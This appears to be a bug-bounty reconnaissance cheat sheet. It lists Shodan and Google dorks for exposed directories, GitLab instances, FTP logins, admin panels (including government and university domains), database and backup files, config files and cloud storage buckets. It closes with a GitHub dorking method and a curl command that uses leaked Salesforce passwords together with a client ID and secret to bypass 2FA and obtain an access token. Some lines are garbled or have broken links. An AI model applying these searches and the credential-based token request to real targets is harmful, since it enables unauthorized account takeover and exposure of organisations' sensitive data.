## [+] Google Dork - Find Bug Bounty programs:

> "submit vulnerability report" | "powered by bugcrowd" | "powered by hackerone" -inurl:news -site:*.de
> 

Few dorks which I use to find common bugs while testing. Add your so it’ll help others

```bash
[ssl.cert.subject.CN](http://ssl.cert.subject.cn/):"*.target. com" http.title:"index of/"

[ssl.cert.subject.CN](http://ssl.cert.subject.cn/):"*.target. com" http.title:"gitlab"

[ssl.cert.subject.CN](http://ssl.cert.subject.cn/):"*.wur.nl" http.title:"gitlab
[ssl.cert.subject.CN](http://ssl.cert.subject.cn/):"*.target. com" "230 login successful" port:"21"

[ssl.cert.subject.CN](http://ssl.cert.subject.cn/):"*.gov.in"+200 http.title:"Admin"

For Gitlab exploit : [https://git.any](https://git.any/). Com/api/v4/users/number_here
kongsecsite:test.com ext:sql | ext:dbf | ext:mdb

site:test.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup

site:test.com ext:php | ext:aspx
site:test.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini
```

# Google Dorks - Cloud Storage:

```html
site:s3.amazonaws.com "target[.]com"
site:blob.core.windows.net "target[.]com"
site:googleapis.com "target[.]com"
site:drive.google.com "target[.]com"
```

**Combine:**

```html
site:s3.amazonaws.com | site:blob.core.windows.net | site:googleapis.com | site:drive.google.com "target[.]com"
```

Add something to narrow the results: **`"confidential” “privileged" “not for public release”`**

Find buckets and sensitive data

# Github Dorking

- [ ]  `target[.]my[.]salesforce[.]com password ==>`you can find a passwords
- [ ]  but when you try login its will ask for 2fa
- [ ]  how you can bypass that and get critical find
- [ ]  search in the same repo for client ID&Secret

```bash
curl [https://login.salesforce](https://login.salesforce/)[.]com/services/oauth2/token -d 'grant_type=password&client_id=ID&client_secret=SECRET&username=USER&password=PASSWORD' -H "X-PrettyPrint: 1"  ⇒ access token ⇒Full Access Via Backend
```
